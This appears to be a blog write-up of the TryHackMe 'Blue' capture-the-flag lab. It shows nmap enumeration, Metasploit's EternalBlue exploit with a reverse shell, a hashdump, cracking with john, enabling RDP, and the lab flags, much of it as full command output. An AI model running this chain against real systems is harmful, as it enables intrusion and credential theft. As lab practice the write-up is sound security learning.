---
title: "Blue Boot2Root Write-Up"
date: 2020-11-11T13:43:28-04:00
author: "Nate Catelli"
tags: ["ctf", "boot2root", "hacking", "writeup", "tryhackme"]
description: "A boot2root writeup of the Blue host from TryHackMe"
type: "post"
draft: false
---

### Introduction:
After participating in the Disney Can-You-Hack-It CTF, I've recently been trying to spend more of my time studying security concepts and offensive penetration testing. Through these studies, I've been trying to understand an attack by both performing the attack with and without the assistance of a framework like metasploit. This post is meant to be the first of many as I attempt to practice documenting both the attack and my methodology.

### Environment
Both attacks are taking place in a fairly flat network consisting of my attack host, a fresh booted livecd of Kali Linux, and the the target host, a freshly booted Windows VM that I knew contained 3 flags to capture.. No other information is known about the host, what it's running or it's OS versioning, however I would be lying if I said I didn't assume that this would be an eternalblue attack based off the name.

### Attacking Blue with Metasploit
I started the attack by opening a tmux session and starting meterpreter with `msfdb run` to spin up a postgres instance to persist scans and recon data and promptly kicked off an nmap scan.

#### Host enumeration
Given that I was investigating a single host, and that I had an unfair suspicion of what kind of attack vector I would be looking for, I started with a default script and service version scan.

```
msf5 > db_nmap -sV -sC -Pn 10.10.201.83
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 01:53 UTC
[*] Nmap: Nmap scan report for ip-10-10-201-83.eu-west-1.compute.internal (10.10.201.83)
[*] Nmap: Host is up (0.00053s latency).
[*] Nmap: Not shown: 991 closed ports
[*] Nmap: PORT      STATE SERVICE      VERSION
[*] Nmap: 135/tcp   open  msrpc        Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)n  tcpwrapped
[*] Nmap: |_ssl-date: 2020-11-11T01:55:05+00:00; 0s from scanner time.
[*] Nmap: 49152/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: 49160/tcp open  msrpc        Microsoft Windows RPC
[*] Nmap: MAC Address: 02:B5:23:84:9D:19 (Unknown)
[*] Nmap: Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: |_clock-skew: mean: 1h29m59s, deviation: 3h00m00s, median: 0s
[*] Nmap: |_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:b5:23:84:9d:19 (unknown)mb-os-discovery:
[*] Nmap: |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
[*] Nmap: |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
[*] Nmap: |   Computer name: Jon-PC
[*] Nmap: |   NetBIOS computer name: JON-PC\x00
[*] Nmap: |   Workgroup: WORKGROUP\x00
[*] Nmap: |_  System time: 2020-11-10T19:54:50-06:00
[*] Nmap: | smb-security-mode:
[*] Nmap: |   account_used: guest
[*] Nmap: |   authentication_level: user
[*] Nmap: |   challenge_response: supported
[*] Nmap: |_  message_signing: disabled (dangerous, but default)
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   2.02:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2020-11-11T01:54:50
[*] Nmap: |_  start_date: 2020-11-11T01:51:00
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 140.63 seconds
```

This initial scan tends to confirm my beliefs that this is an eternalblue attack as it looks like the host is Windows 7 Service Pack 1 machine with listening SMB. In addition, this ended up leaking a name as the computer's name, which is worth keeping in mind as a potential administrative user going forward. Additionally this points out relaxed security setting in the smb services configuration.

Give what I knew so far i decided to probe a little further into SMB with a enumartion of smb using nmap's `smb-enum-shares` and `smb-enum-user` scripts.

```
msf5 > db_nmap --script smb-enum-shares  -p 445 10.10.201.83
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 01:58 UTC
[*] Nmap: Nmap scan report for ip-10-10-201-83.eu-west-1.compute.internal (10.10.201.83)
[*] Nmap: Host is up (0.00020s latency).
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 445/tcp open  microsoft-ds
[*] Nmap: MAC Address: 02:B5:23:84:9D:19 (Unknown)
[*] Nmap: Host script results:
[*] Nmap: | smb-enum-shares:
[*] Nmap: |   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED) |   account_used: <blank>
[*] Nmap: |   \\10.10.201.83\ADMIN$:
[*] Nmap: |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
[*] Nmap: |     Anonymous access: <none>
[*] Nmap: |   \\10.10.201.83\C$:
[*] Nmap: |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
[*] Nmap: |     Anonymous access: <none>
[*] Nmap: |   \\10.10.201.83\IPC$:
[*] Nmap: |     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
[*] Nmap: |_    Anonymous access: READ
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
```

Again this points to anonymous access on the IPC share, another pointer towards eternalblue being the vector. With this information, I decided I should kick off a quick vuln scan via NMA to see if it does infact identify eternalblue. Which it quickly did, as ms17-010.

```
msf5 > db_nmap --script vuln  -p 445 10.10.201.83
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-11 02:03 UTC
[*] Nmap: Nmap scan report for ip-10-10-201-83.eu-west-1.compute.internal (10.10.201.83)
[*] Nmap: Host is up (0.00046s latency).
[*] Nmap: PORT    STATE SERVICE
[*] Nmap: 445/tcp open  microsoft-ds
[*] Nmap: |_clamav-exec: ERROR: Script execution failed (use -d to debug)
[*] Nmap: MAC Address: 02:B5:23:84:9D:19 (Unknown)
[*] Nmap: Host script results:
[*] Nmap: |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
[*] Nmap: |_smb-vuln-ms10-054: false
[*] Nmap: |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
[*] Nmap: | smb-vuln-ms17-010:
[*] Nmap: |   VULNERABLE:
[*] Nmap: |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
[*] Nmap: |     State: VULNERABLE
[*] Nmap: |     IDs:  CVE:CVE-2017-0143
[*] Nmap: |     Risk factor: HIGH
[*] Nmap: |       A critical remote code execution vulnerability exists in Microsoft SMBv1
[*] Nmap: |        servers (ms17-010).
[*] Nmap: |
[*] Nmap: |     Disclosure date: 2017-03-14
[*] Nmap: |     References:
[*] Nmap: |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
[*] Nmap: |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
[*] Nmap: |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 15.51 seconds
```

Given that I had a potential attack I decided to do a quick recap of the services on the host to make sure I didn't miss anything and saw that I'd overlooked RDP listening as well. I decided to keep this in mind for later in case 

```
msf5 > services 
Services
========

host          port   proto  name           state  info
----          ----   -----  ----           -----  ----
10.10.201.83  135    tcp    msrpc          open   Microsoft Windows RPC
10.10.201.83  139    tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
10.10.201.83  445    tcp    microsoft-ds   open   Windows 7 Professional 7601 Service Pack 1 microsoft-ds workgroup: WORKGROUP
10.10.201.83  3389   tcp    ms-wbt-server  open   
10.10.201.83  49152  tcp    unknown        open   Microsoft Windows RPC
10.10.201.83  49153  tcp    unknown        open   Microsoft Windows RPC
10.10.201.83  49154  tcp    unknown        open   Microsoft Windows RPC
10.10.201.83  49158  tcp    unknown        open   Microsoft Windows RPC
10.10.201.83  49160  tcp    unknown        open   Microsoft Windows RPC
```

#### Preparing an attack
I decided to plan for an attempt at eternal blue by first searching for the exploit id `ms17-010`

```
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce
```

Since it's a windows 7 host that's being attacked the second option in the list seems like a perfect candidate. 

```
msf5 > use 2
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS 10.10.201.83
RHOSTS => 10.10.201.83
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.201.83     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.100.83     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

I left the default payload as the staged reverse TCP shell and decided to kick off an attack to see if I could get a shell.

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.100.83:4444 
[*] 10.10.201.83:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.201.83:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.201.83:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.201.83:445 - Connecting to target for exploitation.
[+] 10.10.201.83:445 - Connection established for exploitation.
[+] 10.10.201.83:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.201.83:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.201.83:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.201.83:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.201.83:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.201.83:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.201.83:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.201.83:445 - Sending all but last fragment of exploit packet
[*] 10.10.201.83:445 - Starting non-paged pool grooming
[+] 10.10.201.83:445 - Sending SMBv2 buffers
[+] 10.10.201.83:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.201.83:445 - Sending final SMBv2 buffers.
[*] 10.10.201.83:445 - Sending last fragment of exploit packet!
[*] 10.10.201.83:445 - Receiving response from exploit packet
[+] 10.10.201.83:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.201.83:445 - Sending egg to corrupted connection.
[*] 10.10.201.83:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.201.83
[*] Meterpreter session 1 opened (10.10.100.83:4444 -> 10.10.201.83:49198) at 2020-11-11 02:08:15 +0000
[+] 10.10.201.83:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.201.83:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.201.83:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1 
[*] Starting interaction with 1...

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

SUCCESS! And it left me with System credentials. At this point the machine was mine, but I decided to make sure I had a stable foothold on the machine before proceeding with searching for the flags.

#### Foothold
First step was making sure my shell on the host was stable. So I checked my pid and looked to see if I could migrate it to something like the print spool. 

```
meterpreter > getpid 
Current pid: 1304
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 492   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 560   552   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.execorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe    NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exes.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exenlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.execes.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exem.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exesvchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 900   708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 948   708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1016  660   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exeost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1172  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 1304  708   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1340  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1408  708   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1480  708   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1616  708   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1956  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  
 2060  708   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           
 2072  832   WmiPrvSE.exe                                                       
 2184  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 2220  708   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 2496  708   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           
 2548  708   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
 2956  708   vds.exe               x64   0        NT AUTHORITY\SYSTEM           
 2996  708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 ```

 Luckily for me it already looks like it's in the spool service so there was no need to proceed with a further migration.

 While I already knew where this host was running from deploying it, this `ps` output also reiterated that this host was on EC2 via the ssm-agent, LiteAgent and Ec2Config processes. This was also made apparent in the enumeration stages via reverse dns lookups this is just further evidence in case the earlier point was missed.

 A point that can be confirmed once again with a quick run of the `post/windows/gather/checkvm` module.

 ```
meterpreter > run post/windows/gather/checkvm 

[*] Checking if JON-PC is a Virtual Machine ...
[+] This is a Xen Virtual Machine
```

Finally I grabbed a sysinfo output to confirm a bunch of information that we had already assumed or knew. 

```
meterpreter > sysinfo 
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
```

With all this information, I tried to grab a hashdump to pivot from this shell to a longer-lived user.

```
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

And of course, the there is Jon. With our hashes and users, I dumped these credentials into a file and ran `john` against it with Kali's copy of the `rockyou.txt` password list.

```bash
root@kali:~/ctf/blue# john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
alqfna22         (Jon)
2g 0:00:00:00 DONE (2020-11-11 02:23) 3.076g/s 15692Kp/s 15692Kc/s 15700KC/s alr19882006..alpusidi
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

With the Jon user's password in hand, I ran the `post/windows/manage/enable_rdp` module, while this was probably unnecessary due to having seen the port was available, and was quickly able to connect as the our Jon admin user.

```
meterpreter > run post/windows/manage/enable_rdp 

[*] Enabling Remote Desktop
[*]   RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]   The Terminal Services service is not set to auto, changing it to auto ...
[*]   Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20201111022704_default_10.10.201.83_host.windows.cle_997445.txt
```

#### Wrapping up
With a new shell I was able to find each of the 3 flags in fairly standard locations on the C:\ drive.

- C:\flag1.txt flag{access_the_machine}
- C:\Windows\system32\config\flag2.txt flag{sam_database_elevated_access}
- C:\Users\Jon\Documents\flag3.txt flag{admin_documents_can_be_valuable}